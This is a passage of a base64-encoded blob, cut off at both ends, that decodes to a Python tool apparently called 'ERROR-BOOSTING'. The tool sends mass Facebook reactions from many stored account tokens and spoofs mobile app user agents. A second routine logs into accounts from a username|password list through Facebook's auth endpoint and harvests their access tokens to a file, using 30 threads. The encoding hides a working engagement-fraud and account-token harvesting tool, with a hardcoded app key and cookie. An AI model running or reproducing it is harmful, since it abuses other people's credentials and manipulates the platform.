ZvZGx4RHJHRDsgZHByPTI7IHdkPTk4MHgxNjI4OyBkYXRyPWZ1WlRaeEwtZ3RiQmpUa2ZlQnEtVlZEWiIKICAgIH0KCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMpLnRleHQKCiAgICAgICAgIyBFeHRyYWN0IGBhY3Ryc2AgbnVtYmVyCiAgICAgICAgYWN0cnNfbWF0Y2ggPSByZS5zZWFyY2gociciYWN0cnNcXCI6XFwiKFxkKylcXCInLCByZXNwb25zZSkKICAgICAgICBhY3Ryc19udW1iZXIgPSBhY3Ryc19tYXRjaC5ncm91cCgxKSBpZiBhY3Ryc19tYXRjaCBlbHNlIE5vbmUKCiAgICAgICAgIyBFeHRyYWN0IGBwb3N0X2lkYAogICAgICAgIHBvc3RfaWRfbWF0Y2ggPSByZXNwb25zZS5zcGxpdCgnInBvc3RfaWQiOiInKVsxXS5zcGxpdCgnIicpWzBdIGlmICcicG9zdF9pZCI6IicgaW4gcmVzcG9uc2UgZWxzZSBOb25lCgogICAgICAgIGlmIGFjdHJzX251bWJlciBhbmQgcG9zdF9pZF9tYXRjaDoKICAgICAgICAgICAgcmV0dXJuIGYie2FjdHJzX251bWJlcn1fe3Bvc3RfaWRfbWF0Y2h9IgogICAgICAgIGVsaWYgbm90IGFjdHJzX251bWJlcjoKICAgICAgICAgICAgcmV0dXJuICJhY3RycyBudW1iZXIgbm90IGZvdW5kISIKICAgICAgICBlbGlmIG5vdCBwb3N0X2lkX21hdGNoOgogICAgICAgICAgICByZXR1cm4gInBvc3RfaWQgbm90IGZvdW5kISIKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIGYiQW4gZXJyb3Igb2NjdXJyZWQ6IHtzdHIoZSl9IgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBpZiAndGVybXV4JyBpbiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgZWxpZiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpID09ICd3aW5kb3dzJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQpkZWYgZ2VuZXJhdGVfdXNlcl9hZ2VudCgpOgogICAgZmJhdiA9IGYie3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfSIKICAgIGZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQogICAgZmJydiA9ICcwJwogICAgcmFuZG9tX3NlZWQgPSByYW5kb20uUmFuZG9tKCkKICAgIGFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgogICAgIyBSYW5kb21seSB2YXJ5IHRoZSBBbmRyb2lkIE9TIHZlcnNpb24sIGRldmljZSwgYW5kIGFwcCB2ZXJzaW9uIGZvciByZWFsaXNtCiAgICBkZXZpY2UgPSByYW5kb20uY2hvaWNlKFsiSFVBV0VJIE1BUi1MWDFNIiwgIlNhbXN1bmcgU00tRzk2MEYiLCAiT25lUGx1cyBHTTE5MTMiXSkKICAgIGZiYXZfdmVyc2lvbiA9IHN0cihyYW5kb20ucmFuZGludCg0OSwgMTUwKSkgICMgVXBkYXRlZCByYW5nZSBmb3IgRkJBViB2ZXJzaW9ucwogICAgZmJidl92ZXJzaW9uID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpCiAgICBjYXJyaWVyID0gcmFuZG9tLmNob2ljZShbIk9vcmVkb28gVE4iLCAiT3JhbmdlIiwgIlZvZGFmb25lIiwgIlQtTW9iaWxlIl0pCgogICAgdWFfYmdyYXBoID0gZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZfdmVyc2lvbn0uMC4wLntyYW5kb20ucmFuZHJhbmdlKDIwLCA0OSl9LntyYW5kb20ucmFuZGludCgxMSwgOTkpfTtGQkJWL3tmYmJ2X3ZlcnNpb259OycgXAogICAgICAgICAgICAgICAgZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZ9O0ZCQlYve2ZiYnZ9O0ZCRE0ve3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0yMTA3fX07RkJMQy9mcl9GUjsnIFwKICAgICAgICAgICAgICAgIGYnRkJSVi97ZmJydn07RkJDUi97Y2Fycmllcn07RkJNRi97ZGV2aWNlLnNwbGl0KCIgIilbMF19O0ZCQkQve2RldmljZS5zcGxpdCgiICIpWzBdfTsnIFwKICAgICAgICAgICAgICAgIGYnRkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYve2RldmljZX07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwogICAgCiAgICByZXR1cm4gdWFfYmdyYXBoCgp1YV9iZ3JhcGggPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKCmRlZiBBdXRvUmVhY3QyKCk6CiAgICBkZWYgUmVhY3Rpb24oYWN0b3JfaWQ6IHN0ciwgcG9zdF9pZDogc3RyLCByZWFjdDogc3RyLCB0b2tlbjogc3RyKSAtPiBib29sOgogICAgICAgIHJ1aSA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgIHVzZXJfYWdlbnQgPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKICAgICAgICBydWkuaGVhZGVycy51cGRhdGUoeyJVc2VyLUFnZW50IjogdXNlcl9hZ2VudH0pICAgICAgICAKICAgICAgICBmZWVkYmFja19pZCA9IHN0cihiYXNlNjQuYjY0ZW5jb2RlKGYnZmVlZGJhY2s6e3Bvc3RfaWR9Jy5lbmNvZGUoJ3V0Zi04JykpLmRlY29kZSgndXRmLTgnKSkKICAgICAgICB2YXIgPSB7CiAgICAgICAgICAgICJpbnB1dCI6IHsKICAgICAgICAgICAgICAgICJmZWVkYmFja19yZWZlcnJlciI6ICJuYXRpdmVfbmV3c2ZlZWQiLAogICAgICAgICAgICAgICAgInRyYWNraW5nIjogW05vbmVdLAogICAgICAgICAgICAgICAgImZlZWRiYWNrX2lkIjogZmVlZGJhY2tfaWQsCiAgICAgICAgICAgICAgICAiY2xpZW50X211dGF0aW9uX2lkIjogc3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICAgICAibmVjdGFyX21vZHVsZSI6ICJuZXdzZmVlZF91ZmkiLAogICAgICAgICAgICAgICAgImZlZWRiYWNrX3NvdXJjZSI6ICJuYXRpdmVfbmV3c2ZlZWQiLAogICAgICAgICAgICAgICAgImZlZWRiYWNrX3JlYWN0aW9uX2lkIjogcmVhY3QsCiAgICAgICAgICAgICAgICAiYWN0b3JfaWQiOiBhY3Rvcl9pZCwKICAgICAgICAgICAgICAgICJhY3Rpb25fdGltZXN0YW1wIjogc3RyKHRpbWUudGltZSgpKVs6MTBdCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHRva2VuLAogICAgICAgICAgICAnbWV0aG9kJzogJ3Bvc3QnLAogICAgICAgICAgICAncHJldHR5JzogRmFsc2UsCiAgICAgICAgICAgICdmb3JtYXQnOiAnanNvbicsCiAgICAgICAgICAgICdzZXJ2ZXJfdGltZXN0YW1wcyc6IFRydWUsCiAgICAgICAgICAgICdsb2NhbGUnOiAnaWRfSUQnLAogICAgICAgICAgICAnZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lJzogJ1ZpZXdlclJlYWN0aW9uc011dGF0aW9uJywKICAgICAgICAgICAgJ2ZiX2FwaV9jYWxsZXJfY2xhc3MnOiAnZ3JhcGhzZXJ2aWNlJywKICAgICAgICAgICAgJ2NsaWVudF9kb2NfaWQnOiAnMjg1Nzc4NDA5MzUxODIwNTc4NTExNTI1NTY5NycsCiAgICAgICAgICAgICd2YXJpYWJsZXMnOiBqc29uLmR1bXBzKHZhciksCiAgICAgICAgICAgICdmYl9hcGlfYW5hbHl0aWNzX3RhZ3MnOiBbIkdyYXBoU2VydmljZXMiXSwKICAgICAgICAgICAgJ2NsaWVudF90cmFjZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpCiAgICAgICAgfQogICAgICAgIHBvcyA9IHJ1aS5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncmFwaHFsJywgZGF0YT1kYXRhKS5qc29uKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIHJlYWN0ID09ICcwJzoKICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVNVQ0NFU1NGVUxMWSBSRU1PVkVEIFJFQUNUSU9OIEZST00ge2FjdG9yX2lkfSBPTiB7cG9zdF9pZH0iKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxpZiByZWFjdCBpbiBzdHIocG9zKToKICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVNVQ0NFU1NGVUxMWSBSRUFDVEVEIFdJVEgge2FjdG9yX2lkfSBUTyB7cG9zdF9pZH0iKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1GQUlMRUQgUkVBQ1RFRCBXSVRIIHthY3Rvcl9pZH0gVE8ge3Bvc3RfaWR9IikKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie3JlZH1SRUFDVElPTiBGQUlMRUQgRFVFIFRPIEFOIEVSUk9SLiIpCiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgIGRlZiBwcm9jZXNzX3JlYWN0aW9uKGFjdG9yX2lkLCB0b2tlbiwgcG9zdF9pZCwgcmVhY3QpOgogICAgICAgIGdsb2JhbCBzdWNjZXNzZnVsX3JlYWN0aW9ucwogICAgICAgIGlmIFJlYWN0aW9uKGFjdG9yX2lkPWFjdG9yX2lkLCBwb3N0X2lkPXBvc3RfaWQsIHJlYWN0PXJlYWN0LCB0b2tlbj10b2tlbik6CiAgICAgICAgICAgIHdpdGggY291bnRlcl9sb2NrOgogICAgICAgICAgICAgICAgaWYgc3VjY2Vzc2Z1bF9yZWFjdGlvbnMgPCByZWFjdF9jb3VudDoKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzZnVsX3JlYWN0aW9ucyArPSAxCgogICAgZGVmIGNob29zZV9yZWFjdGlvbigpOgogICAgICAgIGxpbmV4KCkKICAgICAgICBwcmludChmIlsxXSBMSUtFIikKICAgICAgICBwcmludChmIlsyXSBMT1ZFIikKICAgICAgICBwcmludChmIlszXSBIQUhBIikKICAgICAgICBwcmludChmIls0XSBXT1ciKQogICAgICAgIHByaW50KGYiWzVdIENBUkUiKQogICAgICAgIHByaW50KGYiWzZdIFNBRCIpCiAgICAgICAgcHJpbnQoZiJbN10gQU5HUlkiKQogICAgICAgIHByaW50KGYiWzhdIFJFTU9WRSBSRUFDVElPTiIpCiAgICAgICAgbGluZXgoKQogICAgICAgIHJlYyA9IGlucHV0KCdceDFiWzE7MzJtQ0hPT1NFIDogJykKICAgICAgICByZWFjdGlvbl9pZHMgPSB7CiAgICAgICAgICAgICcxJzogJzE2MzU4NTU0ODY2NjY5OTknLAogICAgICAgICAgICAnMic6ICcxNjc4NTI0OTMyNDM0MTAyJywKICAgICAgICAgICAgJzMnOiAnMTE1OTQwNjU4NzY0OTYzJywKICAgICAgICAgICAgJzQnOiAnNDc4NTQ3MzE1NjUwMTQ0JywKICAgICAgICAgICAgJzUnOiAnNjEzNTU3NDIyNTI3ODU4JywKICAgICAgICAgICAgJzYnOiAnOTA4NTYzNDU5MjM2NDY2JywKICAgICAgICAgICAgJzcnOiAnNDQ0ODEzMzQyMzkyMTM3JywKICAgICAgICAgICAgJzgnOiAnMCcKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlYWN0aW9uX2lkcy5nZXQocmVjKQoKICAgIGRlZiBsaW5rdHJhZGlvKHBvc3RfbGluazogc3RyKSAtPiBzdHI6CiAgICAgICAgcGF0dGVybnMgPSBbCiAgICAgICAgICAgIHInL3Bvc3RzLyhcdyspJywKICAgICAgICAgICAgcicvdmlkZW9zLyhcdyspJywKICAgICAgICAgICAgcicvZ3JvdXBzLyhcZCspL3Blcm1hbGluay8oXGQrKScsCiAgICAgICAgICAgIHInL3JlZWxzLyhcdyspJywKICAgICAgICAgICAgcicvbGl2ZS8oXHcrKScsCiAgICAgICAgICAgIHInL3Bob3Rvcy8oXHcrKScsCiAgICAgICAgICAgIHInL3Blcm1hbGluay8oXHcrKScsCiAgICAgICAgICAgIHInc3RvcnlfZmJpZD0oXHcrKScsCiAgICAgICAgICAgIHInZmJpZD0oXGQrKScKICAgICAgICBdICAgICAgICAKICAgICAgICBmb3IgcGF0dGVybiBpbiBwYXR0ZXJuczoKICAgICAgICAgICAgbWF0Y2ggPSByZS5zZWFyY2gocGF0dGVybiwgcG9zdF9saW5rKQogICAgICAgICAgICBpZiBtYXRjaDoKICAgICAgICAgICAgICAgIGlmIHBhdHRlcm4gPT0gcicvZ3JvdXBzLyhcZCspL3Blcm1hbGluay8oXGQrKSc6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoLmdyb3VwKDIpCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2guZ3JvdXAoMSkKICAgICAgICAKICAgICAgICBwcmludChmIntyZWR9SU5WQUxJRCBQT1NUIExJTksgT1IgRk9STUFUIikKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGRlZiBnZXRfaWRzX3Rva2VucyhmaWxlX3BhdGgpOgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgcmV0dXJuIFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZV0KCiAgICBkZWYgY2hvb3NlX3R5cGUoKToKICAgICAgICBjbGVhcigpCiAgICAgICAgbG9nbygpCiAgICAgICAgcHJpbnQoIlsxXSBBIFJFR1VMQVIgUE9TVCIpCiAgICAgICAgcHJpbnQoIlsyXSBBIEdST1VQIFBPU1QiKQogICAgICAgIHByaW50KCJbM10gQSBWSURFTyBQT1NUIikKICAgICAgICBwcmludCgiWzRdIEEgUEhPVE8gUE9TVCIpCiAgICAgICAgbGluZXgoKQogICAgICAgIGNob2ljZSA9IGlucHV0KCdceDFiWzE7MzJtQ0hPT1NFIDogJykKICAgICAgICByZXR1cm4gY2hvaWNlCiAgICBhY3Rvcl9pZHMgPSBnZXRfaWRzX3Rva2VucygnL3NkY2FyZC9FUlJPUi1CT09TVElORy90b2twaWQudHh0JykKICAgIHRva2VucyA9IGdldF9pZHNfdG9rZW5zKCcvc2RjYXJkL0VSUk9SLUJPT1NUSU5HL3Rva3AudHh0JykgICAgCiAgICBjaG9pY2UgPSBjaG9vc2VfdHlwZSgpICAgIAogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBsaW5leCgpCiAgICAgICAgcG9zdF9saW5rID0gaW5wdXQoJ0VOVEVSIFRIRSBGQUNFQk9PSyBQT1NUIExJTks6ICcpCiAgICAgICAgcG9zdF9pZCA9IGxpbmt0cmFkaW8ocG9zdF9saW5rKQogICAgZWxpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIGxpbmV4KCkKICAgICAgICBwb3N0X2xpbmsgPSBpbnB1dCgnRU5URVIgVEhFIEZBQ0VCT09LIEdST1VQIFBPU1QgTElOSzogJykKICAgICAgICBwb3N0X2lkID0gbGlua3RyYWRpbyhwb3N0X2xpbmspCiAgICBlbGlmIGNob2ljZSA9PSAnMyc6CiAgICAgICAgbGluZXgoKQogICAgICAgIHBvc3RfbGluayA9IGlucHV0KCdFTlRFUiBUSEUgRkFDRUJPT0sgVklERU8gUE9TVCBMSU5LOiAnKQogICAgICAgIHBvc3RfaWQgPSBsaW5rdHJhZGlvKHBvc3RfbGluaykKICAgIGVsaWYgY2hvaWNlID09ICc0JzoKICAgICAgICBsaW5leCgpCiAgICAgICAgcG9zdF9saW5rID0gaW5wdXQoJ0VOVEVSIFRIRSBGQUNFQk9PSyBQSE9UTyBQT1NUIExJTks6ICcpCiAgICAgICAgcG9zdF9pZCA9IGxpbmt0cmFkaW8ocG9zdF9saW5rKQogICAgZWxzZToKICAgICAgICBwcmludChmJycne3JlZH1JTlZBTElEIENIT0lDRS4nJycpCiAgICAgICAgcmV0dXJuCiAgICBpZiBub3QgcG9zdF9pZDoKICAgICAgICByZXR1cm4KICAgIHJlYWN0ID0gY2hvb3NlX3JlYWN0aW9uKCkKICAgIGxpbmV4KCkKICAgIGlmIHJlYWN0OgogICAgICAgIGdsb2JhbCByZWFjdF9jb3VudAogICAgICAgIHJlYWN0X2NvdW50ID0gaW50KGlucHV0KCJIT1cgTUFOWSBSRUFDVElPTlMgRE8gWU9VIFdBTlQgVE8gU0VORD8gIikpCiAgICAgICAgbGluZXgoKQogICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTUpIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gWwogICAgICAgICAgICAgICAgZXhlY3V0b3Iuc3VibWl0KHByb2Nlc3NfcmVhY3Rpb24sIGFjdG9yX2lkLCB0b2tlbiwgcG9zdF9pZCwgcmVhY3QpCiAgICAgICAgICAgICAgICBmb3IgYWN0b3JfaWQsIHRva2VuIGluIHppcChhY3Rvcl9pZHMsIHRva2VucykKICAgICAgICAgICAgXVs6cmVhY3RfY291bnRdCiAgICAgICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZXMpOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59e3N1Y2Nlc3NmdWxfcmVhY3Rpb25zfSBTVUNDRVNTRlVMIFJFQUNUSU9OUyBTRU5UISBZT1UnUkUgQVdFU09NRSF7d2hpdGV9IikKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZid7cmVkfUlOVkFMSUQgUkVBQ1RJT04gT1BUSU9OLnt3aGl0ZX0nKQogICAgICAgIAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzIGFzIHRocmVhZAppbXBvcnQgb3MKaW1wb3J0IHN0cmluZwoKIyBSYW5kb20gRkIgdmVyc2lvbiBnZW5lcmF0aW9uCmZiYXYgPSBmJ3tyYW5kb20ucmFuZGludCgxMTEsIDk5OSl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTEsIDk5KX0ue3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0nCmZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQpmYnJ2ID0gJzAnCnJhbmRvbV9zZWVkID0gcmFuZG9tLlJhbmRvbSgpCmFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgojIFVzZXIgYWdlbnQgc3RyaW5nCnVhX2JncmFwaCA9ICdbRkJBTi9GQjRBO0ZCQVYvJyArIHN0cihyYW5kb20ucmFuZGludCg0OSwgNjYpKSArICcuMC4wLicgKyBzdHIocmFuZG9tLnJhbmRyYW5nZSgyMCwgNDkpKSArIHN0cihyYW5kb20ucmFuZGludCgxMSwgOTkpKSArICc7RkJCVi8nICsgc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpICsgJzsnICsgJ1tGQkFOL0ZCNEE7RkJBVi8nICsgZmJhdiArICc7RkJCVi8nICsgZmJidiArICc7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MjEwN307RkJMQy9mcl9GUjtGQlJWLycgKyBmYnJ2ICsgJztGQkNSL09vcmVkb28gVE47RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUk7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvTUFSLUxYMU07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwoKZGVmIGJncmFwaCh1aWQsIHB3LCBwYXRoX2ZpbGUsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdWlkcyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICAKICAgICAgICBpZiB1aWQgaW4gZXhpc3RpbmdfdWlkczoKICAgICAgICAgICAgcHJpbnQoZiIgICAgIHt5ZWxsb3d9W0lORk9dIHtyZWR9QUNDT1VOVCAtLT4ge3doaXRlfXt1aWR9IHtyZWR9YWxyZWFkeSBleGlzdHMuIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkuanNvbigpCiAgICAgICAgCiAgICAgICAgcHJpbnQocmVzcG9uc2UpCiAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcmVzcG9uc2U6CiAgICAgICAgICAgIHRva2VuID0gcmVzcG9uc2VbJ2FjY2Vzc190b2tlbiddCgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aF9maWxlLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie3VpZH18e3Rva2VufVxuIikKCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMybVtTVUNDRVNTXVwwMzNbMG06IEV4dHJhY3RlZCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMxbVtGQUlMRURdXDAzM1swbTogVE8gRVhUUkFDVCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszMW1bRVJST1JdXDAzM1swbSBFcnJvciBleHRyYWN0aW5nIGFjY291bnQ6IHt1aWR9LiBSZWFzb246IHtzdHIoZSl9XDAzM1swbVxuIikKCgpkZWYgcHJveihhY2NvdW50c19maWxlLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKToKICAgICIiIlByb2Nlc3MgdGhlIGFjY291bnRzIGFuZCBleHRyYWN0IHRva2VucyBjb25jdXJyZW50bHkuIiIiCiAgICBzdWNjZXNzX2NvdW50ID0gW10KCiAgICAjIExvYWQgZXhpc3RpbmcgdWlkcyBmcm9tIHRoZSBvdXRwdXQgZmlsZSB0byBhdm9pZCBkdXBsaWNhdGVzCiAgICBleGlzdGluZ191aWRzID0gc2V0KCkKICAgIGlmIG9zLnBhdGguZXhpc3RzKHRva2VuX291dHB1dF9wYXRoKToKICAgICAgICB3aXRoIG9wZW4odG9rZW5fb3V0cHV0X3BhdGgsICdyJykgYXMgZjoKICAgICAgICAgICAgZXhpc3RpbmdfdWlkcyA9IHtsaW5lLnNwbGl0KCd8JylbMF0gZm9yIGxpbmUgaW4gZi5yZWFkbGluZXMoKX0KCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGgsIHVpZCwgcHcsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3VpZHMpCiAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVpZCwgcHcgaW4gW2FjY291bnQuc3BsaXQoJ3wnKSBmb3IgYWNjb3VudCBpbiBhY2NvdW50c11dCgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGZ1dHVyZXM6CiAgICAgICAgICAgICAgICBmdXR1cmUucmVzdWx0KCkKCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAgXDAzM1sxOzM0bVtTVUNDRVNTXVwwM